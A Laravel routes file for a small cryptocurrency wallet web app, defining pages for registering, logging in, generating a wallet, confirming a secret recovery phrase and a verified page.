<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\WalletController;

Route::get('/', function () {
    return view('home.homepage');
});

Route::get('/trust-wallet/generate', function () {
    return view('home.homepage');
});






Route::get('/wallet/register', [WalletController::class, 'showRegister'])->name('wallet.register');
Route::post('/wallet/register', [WalletController::class, 'register'])->name('wallet.register.post');

Route::post('/wallet/login', [WalletController::class, 'login'])->name('wallet.login');
Route::get('/wallet/generate', [WalletController::class, 'generate'])->name('wallet.generate');

Route::get('/confirm/secretphase', [WalletController::class, 'ConfirmSecretphase'])->name('confirm.secretphase');

// Show phrase confirmation page
Route::get('/wallet/confirm-secret-phase', [App\Http\Controllers\WalletController::class, 'ConfirmSecretphase'])
    ->name('wallet.confirm_phase');

// Handle the verification submit
Route::post('/wallet/confirm-secret-phase', [App\Http\Controllers\WalletController::class, 'ConfirmSecretphaseSubmit'])
    ->name('wallet.confirm_phase.submit');

// Verified page redirect
Route::get('/wallet/verified', function () {
    return view('wallet.verified');
})->name('wallet.verified');
